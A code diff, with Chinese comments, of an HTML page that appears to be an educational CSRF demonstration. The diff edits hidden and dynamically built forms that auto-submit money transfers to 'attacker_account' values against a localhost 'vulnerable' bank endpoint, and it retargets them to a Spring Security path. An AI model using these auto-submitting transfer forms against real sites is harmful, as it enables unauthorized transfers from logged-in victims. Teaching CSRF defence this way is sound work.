@@ -239,16 +239,10 @@
 
     <!-- 隐藏的恶意表单（CSRF 攻击载体） -->
     <div class="hidden-forms">
-        <!-- 攻击方式1：自动提交表单 -->
-        <form id="csrfForm1" action="http://localhost:8080/transfer/vulnerable" method="POST">
+        <!-- 攻击方式：针对 Spring Security 危险接口 -->
+        <form id="csrfForm1" action="http://localhost:8080/security/transfer/vulnerable" method="POST">
             <input type="hidden" name="toAccount" value="attacker_account_001">
             <input type="hidden" name="amount" value="5000">
-        </form>
-
-        <!-- 攻击方式2：针对 Spring Security 危险接口 -->
-        <form id="csrfForm2" action="http://localhost:8080/security/transfer/vulnerable" method="POST">
-            <input type="hidden" name="toAccount" value="attacker_account_002">
-            <input type="hidden" name="amount" value="3000">
         </form>
     </div>
 
@@ -330,7 +324,7 @@
                     try {
                         form.submit();
                         addLog('✓ 表单已提交到 iframe（攻击载荷已发送）', 'success');
-                        addLog('  → POST /transfer/vulnerable', 'success');
+                        addLog('  → POST /security/transfer/vulnerable', 'success');
                         addLog('  → toAccount: attacker_account_001', 'success');
                         addLog('  → amount: ¥5000', 'success');
 
@@ -381,7 +375,7 @@
 
                 const form = document.createElement('form');
                 form.method = 'POST';
-                form.action = `${bankUrl}/transfer/vulnerable`;
+                form.action = `${bankUrl}/security/transfer/vulnerable`;
                 form.style.display = 'none';
 
                 const toAccount = document.createElement('input');
@@ -402,7 +396,7 @@
                     try {
                         form.submit();
                         addLog('✓ 动态表单已提交', 'success');
-                        addLog('  → POST /transfer/vulnerable', 'success');
+                        addLog('  → POST /security/transfer/vulnerable', 'success');
                         addLog('  → toAccount: attacker_account_004', 'success');
                         addLog('  → amount: ¥4000', 'success');
 
@@ -429,7 +423,7 @@
                     <strong>🎭 攻击演示完成！</strong><br><br>
                     刚才这个页面模拟了恶意网站的 CSRF 攻击行为：<br>
                     • 发送了 ${attackCount * 3} 个恶意转账请求<br>
-                    • 目标接口：/transfer/vulnerable（无 CSRF 防护）<br>
+                    • 目标接口：/security/transfer/vulnerable（无 CSRF 防护）<br>
                     • 如果这是真实场景且您已登录银行网站，资金已经被转走！<br><br>
                     <strong>这就是为什么需要 CSRF 防护！</strong>
                 `;
